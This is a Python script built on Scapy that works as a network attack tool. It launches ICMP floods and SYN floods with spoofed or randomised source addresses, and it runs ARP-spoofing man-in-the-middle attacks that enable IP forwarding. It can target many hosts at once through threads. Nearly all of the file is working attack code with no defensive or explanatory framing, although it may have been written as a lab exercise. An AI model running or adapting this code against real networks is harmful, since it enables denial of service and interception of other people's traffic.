#! /usr/bin/env python

from scapy.all import *
import argparse
import threading #thread module imported
import time #time module
import os
import ipaddress
import sys
import json

# Initialize parser
parser = argparse.ArgumentParser()

# Adding optional argument
parser.add_argument("-i", "--ip", help = "Destination IP Address")
parser.add_argument("-s", "--source", help = "Source IP Address")
parser.add_argument("--icmp", help = "ICMP Flood - message on the packet")
parser.add_argument("--syn", help = "SYN Flood - message on the packet")
parser.add_argument("--arp", help = "ARP Spoofing - Host IP Address")
parser.add_argument("-n", "--number", help = "Number of packets")
parser.add_argument("-f", "--file", type=argparse.FileType('r'), help = "File with destination IP Addresses")


# Read arguments from command line
args = parser.parse_args() 

#Read json file

# Opening JSON file 
f = open('config.json',) 
  
# returns JSON object as  
# a dictionary 
data = json.load(f) 
  
# Iterating through the json 
# list 
N_THREADS = data['n_threads']
N_PACKETS = data['n_packets']

  
# Closing file 
f.close()


#threads
def thread_delay(thread_name, delay, ip):
	time.sleep(delay)

	if args.source:
		print("Diplaying source as: % s" % args.source)
		ip_layer = IP(dst=ip, src=args.source)
	else:
		ip_layer = IP(dst=ip, src=RandIP("192.168.10.10/24"))


	if args.number:
		numPackets = int(args.number)

	else:
		numPackets = N_PACKETS
	

	if args.icmp:
		
 		send(numPackets*(fragment(ip_layer/ICMP()/args.icmp*6000)))


	elif args.syn:
		tcp=TCP(sport=RandShort(), dport=80, flags="S")
		raw=Raw(args.syn*1024)
		p=ip_layer/tcp/raw
		send(p, loop=1, verbose=0)


	elif args.arp:
		try:
			gtw = ipaddress.ip_address(args.arp)
		except:
			print('Address/netmask is invalid: %s' % args.arp)
			exit(1)

		verbose = True
		enable_ip_route()
		try:
			while True:
				#telling the target that we are the host
				spoof(ip, args.arp, verbose)
				#telling the host that we are the target
				spoof(args.arp, ip, verbose)
				time.sleep(1)
		except KeyboardInterrupt:
			print("[!] Detected CTRL+C ! restoring the network, please wait...")
			restore(ip, args.arp)
			restore(args.arp, ip)
		
	else:
		print("No option selected.")
		os._exit(1)
	


#enable ip route (ip forward) in linux-based distro
def _enable_linux_iproute():
	file_path = "/proc/sys/net/ipv4/ip_forward"
	with open(file_path) as f:
		if f.read() == 1:
			#already enabled
			return
	with open(file_path, "w") as f:
		print(1, file=f)

def enable_ip_route(verbose=True):
	if verbose:
		print("[!] Enabling IP Routing...")
	_enable_linux_iproute()
	if verbose:
		print("[!] IP Routing enabled.")
		
def get_mac(ip):
	"""
	Returns MAC address of any device connected to the network
	If ip is down, returns None instead
	"""
	ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
	if ans:
		return ans[0][1].src
	
def spoof(target_ip, host_ip, verbose=True):
	"""
	Spoofs `target_ip` saying that we are `host_ip`.
	it is accomplished by changing the ARP cache of the target (poisoning)
	"""
	#get the mac of target
	target_mac=get_mac(target_ip)
	
	arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
	
	send(arp_response, verbose=0)
	
	if verbose:
		self_mac = ARP().hwsrc
		print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
		
def restore(target_ip, host_ip, verbose=True):
	#get the real MAC of target
	target_mac = get_mac(target_ip)
	#get the real Mac of spoofed
	host_mac = get_mac(host_ip)
	#crafting the restoring packet
	arp_response = ARP(pdst=target_ip,hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
	#send the restore packet 7 times
	send(arp_response, verbose=0, count=7)
	if verbose:
		print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))

"""
--------------//-------------------------------
"""
if args.ip:
	try:
		ip = ipaddress.ip_address(args.ip)
		print('%s is a correct IP%s address.' % (ip, ip.version))
	except:
		print('Address/netmask is invalid: %s' % args.ip)
		exit(1)

	print("Destination: % s" % args.ip)

	if args.source:
		print("Diplaying source as: % s" % args.source)
		ip_layer = IP(dst=args.ip, src=args.source)
	else:
		ip_layer = IP(dst=args.ip, src=RandIP("192.168.10.10/24"))


	if args.number:
		numPackets = int(args.number)

	else:
		numPackets = N_PACKETS
	

	if args.icmp:
		p = fragment(ip_layer/ICMP()/(args.icmp*60000))
		send(numPackets*p)

	elif args.syn:
		tcp=TCP(sport=RandShort(), dport=80, flags="S")
		raw=Raw(args.syn*1024)
		p=ip_layer/tcp/raw
		print("Sending packets... Press CTRL+C to stop.")

		send(p, loop=1, verbose=0)

	elif args.arp:
		try:
			gtw = ipaddress.ip_address(args.arp)
			print('%s is a correct IP%s address.' % (gtw, gtw.version))
		except:
			print('Address/netmask is invalid: %s' % args.arp)
			exit(1)

		verbose = True
		enable_ip_route()
		try:
			while True:
				#telling the target that we are the host
				spoof(args.ip, args.arp, verbose)
				#telling the host that we are the target
				spoof(args.arp, args.ip, verbose)
				time.sleep(1)
		except KeyboardInterrupt:
			print("[!] Detected CTRL+C ! restoring the network, please wait...")
			restore(args.ip, args.arp)
			restore(args.arp, args.ip)
		
	else:
		print("No option selected.")
		exit(1)
	

else:
	if args.file:
		
		Lines = args.file.readlines()
		n_lines = len(Lines)
		if n_lines > N_THREADS:
				print("Maximum number of IP addresses is: %x"% N_THREADS)
				exit(1)

		#argument validation 
		for line in Lines:
			if(line.strip() != ""):
    				
				try:
					ip = ipaddress.ip_address(line.strip())
					print('%s is a correct IP%s address.' % (ip, ip.version))
				except:
					print('Address/netmask is invalid: %s' % line)
					exit(1)
			

		count = 1;
		# Strips the newline character 
		for line in Lines: 
			
			if(line.strip() != ""):
				print("\nDestination:", line.strip())

				thread_n = threading.Thread(target=thread_delay, args=(count, 0, line.strip()))
				thread_n.start()
				count += 1
		
		# End with CTRL + C
		
		if args.number:
			try:
				time.sleep(0.5)
			except (KeyboardInterrupt, SystemExit):
				print("\n Terminating...")
				os._exit(1)
		else:
			try:
				print("Sending packets... Press CTRL+C to stop.")

				while True:
					time.sleep(0.5)

			except (KeyboardInterrupt, SystemExit):
				if args.arp:
					print("[!] Detected CTRL+C ! restoring the network, please wait...")
					for line in Lines:
						restore(line.strip(), args.arp)
						restore(args.arp, line.strip())
				print("\n Terminating...")
				os._exit(1)
	
		
	else:
		print("Defining one/multiple destination IP Addresses is mandatory.")


